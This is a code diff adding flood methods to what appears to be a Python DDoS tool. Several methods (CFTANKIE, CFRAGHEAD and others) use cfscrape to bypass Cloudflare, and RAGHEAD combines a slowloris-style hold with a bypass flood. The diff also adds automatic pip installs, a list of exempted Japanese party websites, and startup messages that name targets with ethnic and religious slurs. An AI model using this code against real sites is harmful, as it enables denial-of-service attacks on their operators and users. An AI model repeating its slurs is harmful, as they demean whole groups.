@@ -1,4 +1,15 @@
 #!/usr/bin/env python3
+import os, sys, random
+try:
+    import socks, requests, wget, cfscrape, urllib3
+except:
+    if sys.platform.startswith("linux"):
+        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
+    elif sys.platform.startswith("freebsd"):
+        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
+    else:
+        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")
+    import socks, requests, wget, cfscrape, urllib3
  
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
@@ -36,6 +47,7 @@ from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
 from base64 import b64encode
+from random import randint
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -115,6 +127,7 @@ def exit(*message):
 
 class Methods:
     LAYER7_METHODS: Set[str] = {
+        "CFTANKIE", "CFTANKIE2", "CFRAGHEAD", "CFRAGHEAD2", "RAGHEAD", 
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
         "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
@@ -143,6 +156,17 @@ google_agents = [
     "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
 ]
 
+# ATTACK PROHIBITION
+class BlackLists:
+
+    JAPANESE_GOVERMENT = [
+        "https://www.jimin.jp/",
+        "https://cdp-japan.jp/",
+        "https://o-ishin.jp/",
+        "https://www.komei.or.jp/",
+        "https://www.jcp.or.jp/",
+
+    ]
 
 class Counter:
     def __init__(self, value=0):
@@ -680,6 +704,10 @@ class HttpFlood(Thread):
 
         self.methods = {
             "POST": self.POST,
+            "CFTANKIE": self.CFTANKIE,
+            "CFTANKIE2": self.CFTANKIE2,
+            "CFRAGHEAD": self.CFRAGHEAD,
+            "CFRAGHEAD2": self.CFRAGHEAD2,
             "CFB": self.CFB,
             "CFBUAM": self.CFBUAM,
             "XMLRPC": self.XMLRPC,
@@ -689,6 +717,7 @@ class HttpFlood(Thread):
             "DGB": self.DGB,
             "OVH": self.OVH,
             "AVB": self.AVB,
+            "RAGHEAD": self.RAGHEAD,
             "STRESS": self.STRESS,
             "DYN": self.DYN,
             "SLOW": self.SLOW,
@@ -827,7 +856,8 @@ class HttpFlood(Thread):
 
     @staticmethod
     def getMethodType(method: str) -> str:
-        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
+        return "GET" if {method.upper()} & {"CFTANKIE", "CFTANKIE2", "CFRAGHEAD", "CFRAGHEAD2", "RAGHEAD", 
+                                            "CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
                                             "DYN", "SLOW", "PPS", "APACHE",
                                             "BOT", "RHEX", "STOMP"} \
             else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
@@ -978,6 +1008,107 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
+    def CFTANKIE(self):
+        global REQUESTS_SENT, BYTES_SEND
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+        s = None
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            for _ in range(self._rpc):
+                if pro:
+                    with s.get(str(self._target) + "?=" + str(random.randint(0,20000)),
+                               proxies=pro.asRequest(), timeout=45) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+                        continue
+
+                with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=45) as res:
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += Tools.sizeOfRequest(res)
+        Tools.safe_close(s)
+
+    def CFTANKIE2(self):
+        global REQUESTS_SENT, BYTES_SEND
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+        s = None
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            for _ in range(self._rpc):
+                with s.get(str(self._target), timeout=60) as res:
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += Tools.sizeOfRequest(res)
+                with s.post(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=45) as res:
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += Tools.sizeOfRequest(res)
+        Tools.safe_close(s)
+
+    def CFRAGHEAD(self):
+        global REQUESTS_SENT, BYTES_SEND
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        http = urllib3.PoolManager()
+        headersx={"Host" : str(self._host),
+        "Connection" : "keep-alive",
+        "Cache-Control" : "max-age=0",
+        "Upgrade-Insecure-Requests" : "1",
+        "User-Agent" : randchoice(self._useragents),
+        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+        "Accept-Encoding" : "gzip, deflate",
+        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8"}
+
+        s = None
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            for _ in range(self._rpc):
+                if pro:
+                    http.request("GET", str(self._target), proxies=pro.asRequest(), headers=headersx, timeout=60)
+                    http.request("GET /?=" +str(random.randint(0,20000)), proxies=pro.asRequest(), headers=headersx, timeout=60)
+                    with s.get(str(self._target), headers=headersx, proxies=pro.asRequest(), timeout=60) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+                    with s.get(str(self._target) + "?=" + str(random.randint(0,20000)),
+                               proxies=pro.asRequest(), headers=headersx, timeout=60) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+        Tools.safe_close(s)
+
+    def CFRAGHEAD2(self):
+        global REQUESTS_SENT, BYTES_SEND
+        s = None
+
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        http = urllib3.PoolManager()
+        headersx={"Host" : str(self._host),
+        "Connection" : "keep-alive",
+        "Cache-Control" : "max-age=0",
+        "Upgrade-Insecure-Requests" : "1",
+        "User-Agent" : randchoice(self._useragents),
+        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+        "Accept-Encoding" : "gzip, deflate",
+        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8"}
+
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            for _ in range(self._rpc):
+
+                #http.request("GET", str(self._target), headers=headersx, timeout=60)
+                #http.request("GET /?=" +str(random.randint(0,20000)), headers=headersx, timeout=60)
+                with s.get(str(self._target), headers=headersx, timeout=60) as res:
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += Tools.sizeOfRequest(res)
+                with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=60) as res:
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += Tools.sizeOfRequest(res)
+        Tools.safe_close(s)
+
     def CFB(self):
         global REQUESTS_SENT, BYTES_SEND
         pro = None
@@ -1017,6 +1148,39 @@ class HttpFlood(Thread):
             for _ in range(self._rpc):
                 sleep(max(self._rpc / 1000, 1))
                 Tools.send(s, payload)
+        Tools.safe_close(s)
+
+    def RAGHEAD(self):
+        # AVB + SLOW
+        payload: bytes = self.generate_payload()
+        s = None
+        with suppress(Exception), self.open_connection() as s:
+            for _ in range(self._rpc):
+                sleep(max(self._rpc / 1000, 1))
+                Tools.send(s, payload)
+            while Tools.send(s, payload) and s.recv(1):
+                keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
+                Tools.send(s, keep)
+                sleep(max(self._rpc / 1000, 1))
+        Tools.safe_close(s)
+
+        # BYPASS
+        global REQUESTS_SENT, BYTES_SEND
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+        with suppress(Exception), Session() as s:
+            for _ in range(self._rpc):
+                if pro:
+                    with s.get(str(self._target),
+                               proxies=pro.asRequest()) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+                        continue
+
+                with s.get(str(self._target)) as res:
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
 
     def DGB(self):
@@ -1548,6 +1712,11 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
 if __name__ == '__main__':
     with suppress(KeyboardInterrupt):
         with suppress(IndexError):
+
+            print("This tool is against the tankie, ultranationalist, religious right and militarist")
+            print("Only for kacap, tankie, raghead, papist, fundie, kach, hindutva, homophobia, junta and their allies")
+            print("Do not attack western goverment and company, Fatah, PKK and National Unity Government")
+
             one = argv[1].upper()
 
             if one == "HELP":
